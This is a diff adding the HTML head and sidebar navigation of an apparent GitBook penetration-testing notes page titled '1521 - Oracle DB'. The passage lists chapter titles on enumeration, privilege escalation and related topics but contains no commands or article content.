@@ -1,0 +1,2557 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>1521 - Oracle DB · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="Oracle Database is a multi-model database management system produced and marketed by Oracle Corporation.">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="nfs.html" />
+    
+    
+    <link rel="prev" href="1433-microsoft-sql.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../">
+            
+                <a href="../../../">
+            
+                    
+                    Initial page
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../../table-of-content.html">
+            
+                <a href="../../../table-of-content.html">
+            
+                    
+                    Table Of Content
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Infrastructure testing</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    Enumeration
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../packet-capture.html">
+            
+                <a href="../packet-capture.html">
+            
+                    
+                    Packet Capture
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="../host-disocvery.html">
+            
+                <a href="../host-disocvery.html">
+            
+                    
+                    Host Discovery
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    Services / Ports
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.3.1" data-path="ftp.html">
+            
+                <a href="ftp.html">
+            
+                    
+                    21 - FTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.2" data-path="ssh.html">
+            
+                <a href="ssh.html">
+            
+                    
+                    22 - SSH
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.3" data-path="smtp.html">
+            
+                <a href="smtp.html">
+            
+                    
+                    25 - SMTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.4" data-path="dns.html">
+            
+                <a href="dns.html">
+            
+                    
+                    53 - DNS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.5" data-path="dhcp.html">
+            
+                <a href="dhcp.html">
+            
+                    
+                    67 - DHCP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.6" data-path="69-tftp.html">
+            
+                <a href="69-tftp.html">
+            
+                    
+                    69 - TFTP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.7" data-path="finger.html">
+            
+                <a href="finger.html">
+            
+                    
+                    79 - Finger
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.8" data-path="88-kerberos.html">
+            
+                <a href="88-kerberos.html">
+            
+                    
+                    88 - Kerberos
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.9" data-path="rpc.html">
+            
+                <a href="rpc.html">
+            
+                    
+                    111 - RPC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.10" data-path="ident.html">
+            
+                <a href="ident.html">
+            
+                    
+                    113 - ident
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.11" data-path="135-msrpc.html">
+            
+                <a href="135-msrpc.html">
+            
+                    
+                    135 - MSRPC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.12" data-path="netbios.html">
+            
+                <a href="netbios.html">
+            
+                    
+                    137 - Netbios
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.13" data-path="smb.html">
+            
+                <a href="smb.html">
+            
+                    
+                    139/445 - SMB
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.14" data-path="snmp.html">
+            
+                <a href="snmp.html">
+            
+                    
+                    161 - SNMP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.15" data-path="xdmcp.html">
+            
+                <a href="xdmcp.html">
+            
+                    
+                    177 - XDMCP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.16" data-path="ldap.html">
+            
+                <a href="ldap.html">
+            
+                    
+                    363 - LDAP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.17" data-path="443-https.html">
+            
+                <a href="443-https.html">
+            
+                    
+                    443 - HTTPS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.18" data-path="ike.html">
+            
+                <a href="ike.html">
+            
+                    
+                    500 - IKE (IPSEC)
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.19" data-path="rservices.html">
+            
+                <a href="rservices.html">
+            
+                    
+                    512/513/514 - R Services
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.20" data-path="ipmi.html">
+            
+                <a href="ipmi.html">
+            
+                    
+                    623 - IPMI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.21" data-path="873-rsync.html">
+            
+                <a href="873-rsync.html">
+            
+                    
+                    873 - RSYNC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.22" data-path="1099-java-rmi.html">
+            
+                <a href="1099-java-rmi.html">
+            
+                    
+                    1099 - Java RMI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.23" data-path="1433-microsoft-sql.html">
+            
+                <a href="1433-microsoft-sql.html">
+            
+                    
+                    1433 - Microsoft SQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="2.1.3.24" data-path="1521-oracle-db.html">
+            
+                <a href="1521-oracle-db.html">
+            
+                    
+                    1521 - Oracle DB
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.25" data-path="nfs.html">
+            
+                <a href="nfs.html">
+            
+                    
+                    2049 - NFS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.26" data-path="3306-mysql.html">
+            
+                <a href="3306-mysql.html">
+            
+                    
+                    3306 - MySQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.27" data-path="3389-rdp.html">
+            
+                <a href="3389-rdp.html">
+            
+                    
+                    3389 - RDP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.28" data-path="5432-postgressql.html">
+            
+                <a href="5432-postgressql.html">
+            
+                    
+                    5432 - PostgresSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.29" data-path="vnc.html">
+            
+                <a href="vnc.html">
+            
+                    
+                    5900 - VNC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.30" data-path="winrm.html">
+            
+                <a href="winrm.html">
+            
+                    
+                    5985 - WinRM
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.31" data-path="x11.html">
+            
+                <a href="x11.html">
+            
+                    
+                    6000 - X11
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.32" data-path="redis.html">
+            
+                <a href="redis.html">
+            
+                    
+                    6379 - Redis
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.33" data-path="memcached.html">
+            
+                <a href="memcached.html">
+            
+                    
+                    11211 - Memcached
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.34" data-path="rds.html">
+            
+                <a href="rds.html">
+            
+                    
+                    RDS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.35" data-path="sqlite.html">
+            
+                <a href="sqlite.html">
+            
+                    
+                    SQLite
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3.36" data-path="docker.html">
+            
+                <a href="docker.html">
+            
+                    
+                    Docker
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4" data-path="../ipv6/">
+            
+                <a href="../ipv6/">
+            
+                    
+                    IPV6
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.4.1" data-path="../ipv6/scanning.html">
+            
+                <a href="../ipv6/scanning.html">
+            
+                    
+                    Scanning
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4.2" data-path="../ipv6/enumeration.html">
+            
+                <a href="../ipv6/enumeration.html">
+            
+                    
+                    Enumeration
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4.3" data-path="../ipv6/transfering-files.html">
+            
+                <a href="../ipv6/transfering-files.html">
+            
+                    
+                    Transfering files
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4.4" data-path="../ipv6/pivoting-and-routes.html">
+            
+                <a href="../ipv6/pivoting-and-routes.html">
+            
+                    
+                    Pivoting and routes
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4.5" data-path="../ipv6/thc-ipv6.html">
+            
+                <a href="../ipv6/thc-ipv6.html">
+            
+                    
+                    THC IPv6
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../../gaining-access/">
+            
+                <a href="../../gaining-access/">
+            
+                    
+                    Gaining Access
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../../gaining-access/ip-forwarding.html">
+            
+                <a href="../../gaining-access/ip-forwarding.html">
+            
+                    
+                    IP Forwarding
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../../gaining-access/vlan-hopping.html">
+            
+                <a href="../../gaining-access/vlan-hopping.html">
+            
+                    
+                    VLAN hopping
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.3" data-path="../../gaining-access/psexec.html">
+            
+                <a href="../../gaining-access/psexec.html">
+            
+                    
+                    Psexec
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.4" data-path="../../gaining-access/upgrading-shell.html">
+            
+                <a href="../../gaining-access/upgrading-shell.html">
+            
+                    
+                    Upgrading shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.5" data-path="../../gaining-access/reverse-shells-one-liners.html">
+            
+                <a href="../../gaining-access/reverse-shells-one-liners.html">
+            
+                    
+                    Reverse Shells One-Liners
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.6" data-path="../../gaining-access/bruteforce.html">
+            
+                <a href="../../gaining-access/bruteforce.html">
+            
+                    
+                    Bruteforce
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.7" data-path="../../gaining-access/mitm-cleartext-protocols.html">
+            
+                <a href="../../gaining-access/mitm-cleartext-protocols.html">
+            
+                    
+                    MITM cleartext protocols
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.8" data-path="../../gaining-access/null-session.html">
+            
+                <a href="../../gaining-access/null-session.html">
+            
+                    
+                    Null session
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.9" data-path="../../gaining-access/llmnr-nbt-ns-spoofing.html">
+            
+                <a href="../../gaining-access/llmnr-nbt-ns-spoofing.html">
+            
+                    
+                    LLMNR / NBT NS Spoofing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.10" data-path="../../gaining-access/port-knocking.html">
+            
+                <a href="../../gaining-access/port-knocking.html">
+            
+                    
+                    Port knocking
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.11" data-path="../../gaining-access/downloading-transfer-files.html">
+            
+                <a href="../../gaining-access/downloading-transfer-files.html">
+            
+                    
+                    Downloading/Transfer files
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.12" data-path="../../gaining-access/remote-desktop.html">
+            
+                <a href="../../gaining-access/remote-desktop.html">
+            
+                    
+                    Remote Desktop
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.13" data-path="../../gaining-access/nac-bypass.html">
+            
+                <a href="../../gaining-access/nac-bypass.html">
+            
+                    
+                    NAC Bypass
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.14" data-path="../../gaining-access/pass-the-hash.html">
+            
+                <a href="../../gaining-access/pass-the-hash.html">
+            
+                    
+                    Pass-The-Hash
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../../exploitation/">
+            
+                <a href="../../exploitation/">
+            
+                    
+                    Exploitation
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.1" data-path="../../exploitation/solaris.html">
+            
+                <a href="../../exploitation/solaris.html">
+            
+                    
+                    Solaris
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.2" data-path="../../exploitation/ipv6.html">
+            
+                <a href="../../exploitation/ipv6.html">
+            
+                    
+                    IPv6
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.3" data-path="../../exploitation/windows/">
+            
+                <a href="../../exploitation/windows/">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.3.1" data-path="../../exploitation/windows/compiling-code.html">
+            
+                <a href="../../exploitation/windows/compiling-code.html">
+            
+                    
+                    Compiling Code
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.3.2" data-path="../../exploitation/windows/smb-vulnaribilites.html">
+            
+                <a href="../../exploitation/windows/smb-vulnaribilites.html">
+            
+                    
+                    SMB Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.3.3" data-path="../../exploitation/windows/kerberos-attacks.html">
+            
+                <a href="../../exploitation/windows/kerberos-attacks.html">
+            
+                    
+                    Kerberos Attacks
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../../privilege-esclation/">
+            
+                <a href="../../privilege-esclation/">
+            
+                    
+                    Privilege Escalation
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="../../privilege-esclation/situational-awareness/">
+            
+                <a href="../../privilege-esclation/situational-awareness/">
+            
+                    
+                    Situational Awareness
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1.1" data-path="../../privilege-esclation/situational-awareness/linux.html">
+            
+                <a href="../../privilege-esclation/situational-awareness/linux.html">
+            
+                    
+                    Linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.1.2" data-path="../../privilege-esclation/situational-awareness/windows/">
+            
+                <a href="../../privilege-esclation/situational-awareness/windows/">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1.2.1" data-path="../../privilege-esclation/situational-awareness/windows/registry.html">
+            
+                <a href="../../privilege-esclation/situational-awareness/windows/registry.html">
+            
+                    
+                    Registry
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.1.2.2" data-path="../../privilege-esclation/situational-awareness/windows/powerview.html">
+            
+                <a href="../../privilege-esclation/situational-awareness/windows/powerview.html">
+            
+                    
+                    PowerView
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.1.2.3" data-path="../../privilege-esclation/situational-awareness/windows/fsmo-roles.html">
+            
+                <a href="../../privilege-esclation/situational-awareness/windows/fsmo-roles.html">
+            
+                    
+                    FSMO Roles
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="../../privilege-esclation/windows/">
+            
+                <a href="../../privilege-esclation/windows/">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.2.1" data-path="../../privilege-esclation/windows/disable-apps-and-firewall.html">
+            
+                <a href="../../privilege-esclation/windows/disable-apps-and-firewall.html">
+            
+                    
+                    Disable Apps and Firewall
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2.2" data-path="../../privilege-esclation/windows/add-user-script.html">
+            
+                <a href="../../privilege-esclation/windows/add-user-script.html">
+            
+                    
+                    Add user script
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2.3" data-path="../../privilege-esclation/windows/uac-bypass.html">
+            
+                <a href="../../privilege-esclation/windows/uac-bypass.html">
+            
+                    
+                    UAC Bypass
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2.4" data-path="../../privilege-esclation/windows/icacls.html">
+            
+                <a href="../../privilege-esclation/windows/icacls.html">
+            
+                    
+                    icacls
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2.5" data-path="../../privilege-esclation/windows/running-services.html">
+            
+                <a href="../../privilege-esclation/windows/running-services.html">
+            
+                    
+                    Running services
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2.6" data-path="../../privilege-esclation/windows/common-exploits.html">
+            
+                <a href="../../privilege-esclation/windows/common-exploits.html">
+            
+                    
+                    Common Exploits
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.3" data-path="../../privilege-esclation/linux/">
+            
+                <a href="../../privilege-esclation/linux/">
+            
+                    
+                    Linux
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.3.1" data-path="../../privilege-esclation/linux/suid-shell-script.html">
+            
+                <a href="../../privilege-esclation/linux/suid-shell-script.html">
+            
+                    
+                    SUID Shell script
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.3.2" data-path="../../privilege-esclation/linux/cve-2019-14287.html">
+            
+                <a href="../../privilege-esclation/linux/cve-2019-14287.html">
+            
+                    
+                    CVE-2019-14287
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.3.3" data-path="../../privilege-esclation/linux/kernel-exploit.html">
+            
+                <a href="../../privilege-esclation/linux/kernel-exploit.html">
+            
+                    
+                    Kernel exploit
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.4" data-path="../../privilege-esclation/solaris.html">
+            
+                <a href="../../privilege-esclation/solaris.html">
+            
+                    
+                    Solaris
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.5" data-path="../../privilege-esclation/freebsd.html">
+            
+                <a href="../../privilege-esclation/freebsd.html">
+            
+                    
+                    FreeBSD
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.6" data-path="../../privilege-esclation/automated-tools.html">
+            
+                <a href="../../privilege-esclation/automated-tools.html">
+            
+                    
+                    Automated tools
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.7" data-path="../../privilege-esclation/metasploit-modules.html">
+            
+                <a href="../../privilege-esclation/metasploit-modules.html">
+            
+                    
+                    Metasploit Modules
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.8" data-path="../../privilege-esclation/password-dumping.html">
+            
+                <a href="../../privilege-esclation/password-dumping.html">
+            
+                    
+                    Password Dumping
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5" data-path="../../breakout/">
+            
+                <a href="../../breakout/">
+            
+                    
+                    Breakout
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.5.1" data-path="../../breakout/lolbas.html">
+            
+                <a href="../../breakout/lolbas.html">
+            
+                    
+                    LOLBas
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.2" data-path="../../breakout/powershell-constrained-language-byass.html">
+            
+                <a href="../../breakout/powershell-constrained-language-byass.html">
+            
+                    
+                    powershell constrained language byass
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.3" data-path="../../breakout/alternatives-to-command-prompt.md">
+            
+                <span>
+            
+                    
+                    Alternatives to command prompt
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.4" data-path="../../breakout/windows-utilities.html">
+            
+                <a href="../../breakout/windows-utilities.html">
+            
+                    
+                    Windows utilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.5" data-path="../../breakout/applocker.html">
+            
+                <a href="../../breakout/applocker.html">
+            
+                    
+                    Applocker
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.6" data-path="../../breakout/restricted-shells.html">
+            
+                <a href="../../breakout/restricted-shells.html">
+            
+                    
+                    Restricted shells
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.7" data-path="../../breakout/environmental-variables-bypassing-path-restrictions.html">
+            
+                <a href="../../breakout/environmental-variables-bypassing-path-restrictions.html">
+            
+                    
+                    Environmental Variables / Bypassing Path Restrictions
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.5.8" data-path="../../breakout/docker-escape.html">
+            
+                <a href="../../breakout/docker-escape.html">
+            
+                    
+                    Docker escape
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.6" data-path="../../presistance/">
+            
+                <a href="../../presistance/">
+            
+                    
+                    Presistance
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.6.1" data-path="../../presistance/windows.html">
+            
+                <a href="../../presistance/windows.html">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.7" data-path="../../pivoting/">
+            
+                <a href="../../pivoting/">
+            
+                    
+                    Pivoting
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.7.1" data-path="../../pivoting/adding-routes.html">
+            
+                <a href="../../pivoting/adding-routes.html">
+            
+                    
+                    Adding routes
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8" data-path="../../password-cracking/">
+            
+                <a href="../../password-cracking/">
+            
+                    
+                    Password Cracking
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.8.1" data-path="../../password-cracking/hashcat.html">
+            
+                <a href="../../password-cracking/hashcat.html">
+            
+                    
+                    Hashcat
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.2" data-path="../../password-cracking/john.html">
+            
+                <a href="../../password-cracking/john.html">
+            
+                    
+                    John
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.3" data-path="../../password-cracking/cisco-passwords.html">
+            
+                <a href="../../password-cracking/cisco-passwords.html">
+            
+                    
+                    Cisco Passwords
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.4" data-path="../../password-cracking/passwords-lists.html">
+            
+                <a href="../../password-cracking/passwords-lists.html">
+            
+                    
+                    Passwords Lists
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.8.5" data-path="../../password-cracking/generating-wordlist.html">
+            
+                <a href="../../password-cracking/generating-wordlist.html">
+            
+                    
+                    Generating wordlist
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9" data-path="../../tools/">
+            
+                <a href="../../tools/">
+            
+                    
+                    Tools
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.9.1" data-path="../../tools/nishang.html">
+            
+                <a href="../../tools/nishang.html">
+            
+                    
+                    Nishang
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.2" data-path="../../tools/uacme.html">
+            
+                <a href="../../tools/uacme.html">
+            
+                    
+                    UACME
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.3" data-path="../../tools/bypass-uac.html">
+            
+                <a href="../../tools/bypass-uac.html">
+            
+                    
+                    Bypass-UAC
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.4" data-path="../../tools/msbuildapicaller.html">
+            
+                <a href="../../tools/msbuildapicaller.html">
+            
+                    
+                    MSBuildAPICaller
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.5" data-path="../../tools/impacket.html">
+            
+                <a href="../../tools/impacket.html">
+            
+                    
+                    Impacket
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.6" data-path="../../tools/sharppersist.html">
+            
+                <a href="../../tools/sharppersist.html">
+            
+                    
+                    SharpPersist
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.7" data-path="../../tools/terminals.html">
+            
+                <a href="../../tools/terminals.html">
+            
+                    
+                    Terminals
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.8" data-path="../../tools/ip-calculation.html">
+            
+                <a href="../../tools/ip-calculation.html">
+            
+                    
+                    IP Calculation
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.9" data-path="../../tools/pwsh.html">
+            
+                <a href="../../tools/pwsh.html">
+            
+                    
+                    pwsh
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.10" data-path="../../tools/pstools-sysinternals.html">
+            
+                <a href="../../tools/pstools-sysinternals.html">
+            
+                    
+                    psTools / Sysinternals
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.11" data-path="../../tools/unlock-applocker.html">
+            
+                <a href="../../tools/unlock-applocker.html">
+            
+                    
+                    Unlock applocker
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.12" data-path="../../tools/enum4linux.html">
+            
+                <a href="../../tools/enum4linux.html">
+            
+                    
+                    enum4linux
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.13" data-path="../../tools/bloodhound/">
+            
+                <a href="../../tools/bloodhound/">
+            
+                    
+                    Bloodhound
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.9.13.1" data-path="../../tools/bloodhound/aclpwn.html">
+            
+                <a href="../../tools/bloodhound/aclpwn.html">
+            
+                    
+                    aclpwn
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.14" data-path="../../tools/mitm6.html">
+            
+                <a href="../../tools/mitm6.html">
+            
+                    
+                    mitm6
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.15" data-path="../../tools/enyx.html">
+            
+                <a href="../../tools/enyx.html">
+            
+                    
+                    Enyx
+            
+                </a>
+            
